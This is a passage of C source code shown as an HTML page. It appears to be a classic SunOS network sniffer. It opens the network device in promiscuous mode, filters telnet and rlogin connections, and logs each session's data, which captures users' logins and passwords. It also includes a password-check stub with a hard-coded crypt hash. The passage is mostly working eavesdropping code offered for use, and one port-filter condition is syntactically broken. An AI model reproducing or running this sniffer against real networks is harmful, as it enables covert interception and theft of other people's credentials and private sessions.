<br><tt><font color="#FF0000">&nbsp; SFL(5,TH_URG, 'U');</font></tt>
<br><tt><font color="#FF0000">&nbsp; iobuf[6]=0;</font></tt>
<br><tt><font color="#FF0000">&nbsp; return(iobuf);</font></tt>
<br><tt><font color="#FF0000">}</font></tt>
<p><tt><font color="#FF0000">char *SERVp(port)</font></tt>
<br><tt><font color="#FF0000">register u_int port;</font></tt>
<br><tt><font color="#FF0000">{ static char buf[10];</font></tt>
<br><tt><font color="#FF0000">&nbsp; register char *p;</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp; switch(port) {</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; case IPPORT_LOGINSERVER:
p="rlogin"; break;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; case IPPORT_TELNET:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
p="telnet"; break;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; case IPPORT_SMTP:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
p="smtp"; break;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; default: sprintf(buf,"%u",port);
p=buf; break;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; }</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; return(p);</font></tt>
<br><tt><font color="#FF0000">}</font></tt>
<p><tt><font color="#FF0000">char *Ptm(t)</font></tt>
<br><tt><font color="#FF0000">register time_t *t;</font></tt>
<br><tt><font color="#FF0000">{ register char *p = ctime(t);</font></tt>
<br><tt><font color="#FF0000">&nbsp; p[strlen(p)-6]=0; /* strip " YYYY\n"
*/</font></tt>
<br><tt><font color="#FF0000">&nbsp; return(p);</font></tt>
<br><tt><font color="#FF0000">}</font></tt>
<p><tt><font color="#FF0000">char *NOWtm()</font></tt>
<br><tt><font color="#FF0000">{ time_t tm;</font></tt>
<br><tt><font color="#FF0000">&nbsp; time(&amp;tm);</font></tt>
<br><tt><font color="#FF0000">&nbsp; return( Ptm(&amp;tm) );</font></tt>
<br><tt><font color="#FF0000">}</font></tt>
<p><tt><font color="#FF0000">#define MAX(a,b) (((a)>(b))?(a):(b))</font></tt>
<br><tt><font color="#FF0000">#define MIN(a,b) (((a)&lt;(b))?(a):(b))</font></tt>
<p><tt><font color="#FF0000">/* add an item */</font></tt>
<br><tt><font color="#FF0000">#define ADD_NODE(SIP,DIP,SPORT,DPORT,DATA,LEN)
{ \</font></tt>
<br><tt><font color="#FF0000">&nbsp; register struct CREC *CLtmp = \</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
(struct CREC *)malloc(sizeof(struct CREC)); \</font></tt>
<br><tt><font color="#FF0000">&nbsp; time( &amp;(CLtmp->Time) ); \</font></tt>
<br><tt><font color="#FF0000">&nbsp; CLtmp->SRCip.s_addr = SIP.s_addr;
\</font></tt>
<br><tt><font color="#FF0000">&nbsp; CLtmp->DSTip.s_addr = DIP.s_addr;
\</font></tt>
<br><tt><font color="#FF0000">&nbsp; CLtmp->SRCport = SPORT; \</font></tt>
<br><tt><font color="#FF0000">&nbsp; CLtmp->DSTport = DPORT; \</font></tt>
<br><tt><font color="#FF0000">&nbsp; CLtmp->Length = MIN(LEN,MAXBUFLEN);
\</font></tt>
<br><tt><font color="#FF0000">&nbsp; bcopy( (u_char *)DATA, (u_char *)CLtmp->Data,
CLtmp->Length); \</font></tt>
<br><tt><font color="#FF0000">&nbsp; CLtmp->PKcnt = 1; \</font></tt>
<br><tt><font color="#FF0000">&nbsp; CLtmp->Next = CLroot; \</font></tt>
<br><tt><font color="#FF0000">&nbsp; CLtmp->Last = NULL; \</font></tt>
<br><tt><font color="#FF0000">&nbsp; CLroot = CLtmp; \</font></tt>
<br><tt><font color="#FF0000">}</font></tt>
<p><tt><font color="#FF0000">register struct CREC *GET_NODE(Sip,SP,Dip,DP)</font></tt>
<br><tt><font color="#FF0000">register struct in_addr Sip,Dip;</font></tt>
<br><tt><font color="#FF0000">register u_int SP,DP;</font></tt>
<br><tt><font color="#FF0000">{ register struct CREC *CLr = CLroot;</font></tt>
<p><tt><font color="#FF0000">&nbsp; while(CLr != NULL) {</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; if( (CLr->SRCport == SP)
&amp;&amp; (CLr->DSTport == DP) &amp;&amp;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
IPeq(CLr->SRCip,Sip) &amp;&amp; IPeq(CLr->DSTip,Dip) )</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
break;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; CLr = CLr->Next;</font></tt>
<br><tt><font color="#FF0000">&nbsp; }</font></tt>
<br><tt><font color="#FF0000">&nbsp; return(CLr);</font></tt>
<br><tt><font color="#FF0000">}</font></tt>
<p><tt><font color="#FF0000">#define ADDDATA_NODE(CL,DATA,LEN) { \</font></tt>
<br><tt><font color="#FF0000">&nbsp;bcopy((u_char *)DATA, (u_char *)&amp;CL->Data[CL->Length],LEN);
\</font></tt>
<br><tt><font color="#FF0000">&nbsp;CL->Length += LEN; \</font></tt>
<br><tt><font color="#FF0000">}</font></tt>
<p><tt><font color="#FF0000">#define PR_DATA(dp,ln) {&nbsp;&nbsp;&nbsp;
\</font></tt>
<br><tt><font color="#FF0000">&nbsp; register u_char lastc=0; \</font></tt>
<br><tt><font color="#FF0000">&nbsp; while(ln-- >0) { \</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; if(*dp &lt; 32)
{&nbsp; \</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
switch(*dp) { \</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
case '\0': if((lastc=='\r') || (lastc=='\n') || lastc=='\0') \</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
break; \</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
case '\r': \</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
case '\n': fprintf(LOG,"\n&nbsp;&nbsp;&nbsp;&nbsp; : "); \</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
break; \</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
default&nbsp; : fprintf(LOG,"^%c", (*dp + 64)); \</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
break; \</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
} \</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; } else { \</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
if(isprint(*dp)) fputc(*dp,LOG); \</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
else fprintf(LOG,"(%d)",*dp); \</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; } \</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; lastc = *dp++; \</font></tt>
<br><tt><font color="#FF0000">&nbsp; } \</font></tt>
<br><tt><font color="#FF0000">&nbsp; fflush(LOG); \</font></tt>
<br><tt><font color="#FF0000">}</font></tt>
<p><tt><font color="#FF0000">void END_NODE(CLe,d,dl,msg)</font></tt>
<br><tt><font color="#FF0000">register struct CREC *CLe;</font></tt>
<br><tt><font color="#FF0000">register u_char *d;</font></tt>
<br><tt><font color="#FF0000">register int dl;</font></tt>
<br><tt><font color="#FF0000">register char *msg;</font></tt>
<br><tt><font color="#FF0000">{</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; fprintf(LOG,"\n-- TCP/IP LOG
-- TM: %s --\n", Ptm(&amp;CLe->Time));</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; fprintf(LOG," PATH: %s(%s) =>",
Symaddr(CLe->SRCip),SERVp(CLe->SRCport));</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; fprintf(LOG," %s(%s)\n", Symaddr(CLe->DSTip),SERVp(CLe->DSTport));</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; fprintf(LOG," STAT: %s, %d pkts,
%d bytes [%s]\n",</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
NOWtm(),CLe->PKcnt,(CLe->Length+dl),msg);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; fprintf(LOG," DATA: ");</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; { register u_int i = CLe->Length;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; register u_char
*p = CLe->Data;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PR_DATA(p,i);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PR_DATA(d,dl);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; }</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp; fprintf(LOG,"\n-- \n");</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; fflush(LOG);</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp; if(CLe->Next != NULL)</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; CLe->Next->Last = CLe->Last;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; if(CLe->Last != NULL)</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; CLe->Last->Next = CLe->Next;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; else</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; CLroot = CLe->Next;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; free(CLe);</font></tt>
<br><tt><font color="#FF0000">}</font></tt>
<p><tt><font color="#FF0000">/* 30 mins (x 60 seconds) */</font></tt>
<br><tt><font color="#FF0000">#define IDLE_TIMEOUT 1800</font></tt>
<br><tt><font color="#FF0000">#define IDLE_NODE() { \</font></tt>
<br><tt><font color="#FF0000">&nbsp; time_t tm; \</font></tt>
<br><tt><font color="#FF0000">&nbsp; time(&amp;tm); \</font></tt>
<br><tt><font color="#FF0000">&nbsp; if(LastTIME&lt;tm) { \</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; register struct
CREC *CLe,*CLt = CLroot; \</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; LastTIME=(tm+IDLE_TIMEOUT);
tm-=IDLE_TIMEOUT; \</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; while(CLe=CLt) {
\</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CLt=CLe->Next;
\</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(CLe->Time
&lt;tm) \</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
END_NODE(CLe,(u_char *)NULL,0,"IDLE TIMEOUT"); \</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; } \</font></tt>
<br><tt><font color="#FF0000">&nbsp; } \</font></tt>
<br><tt><font color="#FF0000">}</font></tt>
<p><tt><font color="#FF0000">void filter(cp, pktlen)</font></tt>
<br><tt><font color="#FF0000">register char *cp;</font></tt>
<br><tt><font color="#FF0000">register u_int pktlen;</font></tt>
<br><tt><font color="#FF0000">{</font></tt>
<br><tt><font color="#FF0000">&nbsp;register struct ip&nbsp;&nbsp;&nbsp;&nbsp;
*ip;</font></tt>
<br><tt><font color="#FF0000">&nbsp;register struct tcphdr *tcph;</font></tt>
<p><tt><font color="#FF0000">&nbsp;{ register u_short EtherType=ntohs(((struct
ether_header *)cp)->ether_type);</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp; if(EtherType &lt; 0x600) {</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; EtherType = *(u_short
*)(cp + SZETH + 6);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; cp+=8; pktlen-=8;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; }</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp; if(EtherType != ETHERTYPE_IP)
/* chuk it if its not IP */</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return;</font></tt>
<br><tt><font color="#FF0000">&nbsp;}</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; /* ugh, gotta do an alignment
:-( */</font></tt>
<br><tt><font color="#FF0000">&nbsp;bcopy(cp + SZETH, (char *)Packet,(int)(pktlen
- SZETH));</font></tt>
<p><tt><font color="#FF0000">&nbsp;ip = (struct ip *)Packet;</font></tt>
<br><tt><font color="#FF0000">&nbsp;if( ip->ip_p != IPPROTO_TCP) /* chuk
non tcp pkts */</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; return;</font></tt>
<br><tt><font color="#FF0000">&nbsp;tcph = (struct tcphdr *)(Packet + IPHLEN);</font></tt>
<p><tt><font color="#FF0000">&nbsp;if(!( (TCPD == IPPORT_TELNET) ||</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (TCPD
== IPPORT_LOGINSERVER) ||</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; )) return;</font></tt>
<p><tt><font color="#FF0000">&nbsp;{ register struct CREC *CLm;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; register int length = ((IPLEN
- (IPHLEN * 4)) - (TCPOFF * 4));</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; register u_char *p = (u_char
*)Packet;</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp; p += ((IPHLEN * 4) + (TCPOFF
* 4));</font></tt>
<p><tt><font color="#FF0000">&nbsp;if(debug) {</font></tt>
<br><tt><font color="#FF0000">&nbsp; fprintf(LOG,"PKT: (%s %04X) ", TCPflags(tcph->th_flags),length);</font></tt>
<br><tt><font color="#FF0000">&nbsp; fprintf(LOG,"%s[%s] => ", inet_ntoa(IPS),SERVp(TCPS));</font></tt>
<br><tt><font color="#FF0000">&nbsp; fprintf(LOG,"%s[%s]\n", inet_ntoa(IPD),SERVp(TCPD));</font></tt>
<br><tt><font color="#FF0000">&nbsp;}</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp; if( CLm = GET_NODE(IPS, TCPS,
IPD, TCPD) ) {</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CLm->PKcnt++;</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(length>0)</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
if( (CLm->Length + length) &lt; MAXBUFLEN ) {</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
ADDDATA_NODE( CLm, p,length);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
} else {</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
END_NODE( CLm, p,length, "DATA LIMIT");</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
}</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(TCPFL(TH_FIN|TH_RST))
{</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
END_NODE( CLm, (u_char *)NULL,0,TCPFL(TH_FIN)?"TH_FIN":"TH_RST" );</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp; } else {</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(TCPFL(TH_SYN))
{</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
ADD_NODE(IPS,IPD,TCPS,TCPD,p,length);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp; }</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp; IDLE_NODE();</font></tt>
<p><tt><font color="#FF0000">&nbsp;}</font></tt>
<p><tt><font color="#FF0000">}</font></tt>
<p><tt><font color="#FF0000">/* signal handler</font></tt>
<br><tt><font color="#FF0000">&nbsp;*/</font></tt>
<br><tt><font color="#FF0000">void death()</font></tt>
<br><tt><font color="#FF0000">{ register struct CREC *CLe;</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; while(CLe=CLroot)</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
END_NODE( CLe, (u_char *)NULL,0, "SIGNAL");</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; fprintf(LOG,"\nLog ended
at => %s\n",NOWtm());</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; fflush(LOG);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; if(LOG != stdout)</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
fclose(LOG);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; exit(1);</font></tt>
<br><tt><font color="#FF0000">}</font></tt>
<p><tt><font color="#FF0000">/* opens network interface, performs ioctls
and reads from it,</font></tt>
<br><tt><font color="#FF0000">&nbsp;* passing data to filter function</font></tt>
<br><tt><font color="#FF0000">&nbsp;*/</font></tt>
<br><tt><font color="#FF0000">void do_it()</font></tt>
<br><tt><font color="#FF0000">{</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; int cc;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; char *buf;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; u_short sp_ts_len;</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; if(!(buf=malloc(CHUNKSIZE)))</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Pexit(1,"Eth: malloc");</font></tt>
<p><tt><font color="#FF0000">/* this /dev/nit initialization code pinched
from etherfind */</font></tt>
<br><tt><font color="#FF0000">&nbsp; {</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; struct strioctl si;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; struct ifreq&nbsp;&nbsp;&nbsp;
ifr;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; struct timeval&nbsp; timeout;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; u_int&nbsp; chunksize
= CHUNKSIZE;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; u_long if_flags&nbsp;
= NI_PROMISC;</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; if((if_fd = open(NIT_DEV,
O_RDONLY)) &lt; 0)</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Pexit(1,"Eth: nit open");</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; if(ioctl(if_fd, I_SRDOPT,
(char *)RMSGD) &lt; 0)</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Pexit(1,"Eth: ioctl (I_SRDOPT)");</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; si.ic_timout = INFTIM;</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; if(ioctl(if_fd, I_PUSH,
"nbuf") &lt; 0)</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Pexit(1,"Eth: ioctl (I_PUSH \"nbuf\")");</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; timeout.tv_sec = 1;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; timeout.tv_usec = 0;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; si.ic_cmd = NIOCSTIME;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; si.ic_len = sizeof(timeout);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; si.ic_dp&nbsp; = (char
*)&amp;timeout;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; if(ioctl(if_fd, I_STR,
(char *)&amp;si) &lt; 0)</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Pexit(1,"Eth: ioctl (I_STR: NIOCSTIME)");</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; si.ic_cmd = NIOCSCHUNK;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; si.ic_len = sizeof(chunksize);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; si.ic_dp&nbsp; = (char
*)&amp;chunksize;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; if(ioctl(if_fd, I_STR,
(char *)&amp;si) &lt; 0)</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Pexit(1,"Eth: ioctl (I_STR: NIOCSCHUNK)");</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; strncpy(ifr.ifr_name, device,
sizeof(ifr.ifr_name));</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; ifr.ifr_name[sizeof(ifr.ifr_name)
- 1] = '\0';</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; si.ic_cmd = NIOCBIND;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; si.ic_len = sizeof(ifr);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; si.ic_dp&nbsp; = (char
*)&amp;ifr;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; if(ioctl(if_fd, I_STR,
(char *)&amp;si) &lt; 0)</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Pexit(1,"Eth: ioctl (I_STR: NIOCBIND)");</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; si.ic_cmd = NIOCSFLAGS;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; si.ic_len = sizeof(if_flags);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; si.ic_dp&nbsp; = (char
*)&amp;if_flags;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; if(ioctl(if_fd, I_STR,
(char *)&amp;si) &lt; 0)</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Pexit(1,"Eth: ioctl (I_STR: NIOCSFLAGS)");</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; if(ioctl(if_fd, I_FLUSH,
(char *)FLUSHR) &lt; 0)</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Pexit(1,"Eth: ioctl (I_FLUSH)");</font></tt>
<br><tt><font color="#FF0000">&nbsp; }</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; while ((cc = read(if_fd,
buf, CHUNKSIZE)) >= 0) {</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
register char *bp = buf,</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
*bufstop = (buf + cc);</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
while (bp &lt; bufstop) {</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
register char *cp = bp;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
register struct nit_bufhdr *hdrp;</font></tt>
<p><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
hdrp = (struct nit_bufhdr *)cp;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
cp += sizeof(struct nit_bufhdr);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
bp += hdrp->nhb_totlen;</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
filter(cp, (u_long)hdrp->nhb_msglen);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
}</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; }</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp;&nbsp; Pexit((-1),"Eth: read");</font></tt>
<br><tt><font color="#FF0000">}</font></tt>
<br><tt><font color="#FF0000">&nbsp;/* Authorize your proogie,generate
your own password and uncomment here */</font></tt>
<br><tt><font color="#FF0000">/* #define AUTHPASSWD "EloiZgZejWyms" */</font></tt>
<p><tt><font color="#FF0000">void getauth()</font></tt>
<br><tt><font color="#FF0000">{ char *buf,*getpass(),*crypt();</font></tt>
<br><tt><font color="#FF0000">&nbsp; char pwd[21],prmpt[81];</font></tt>
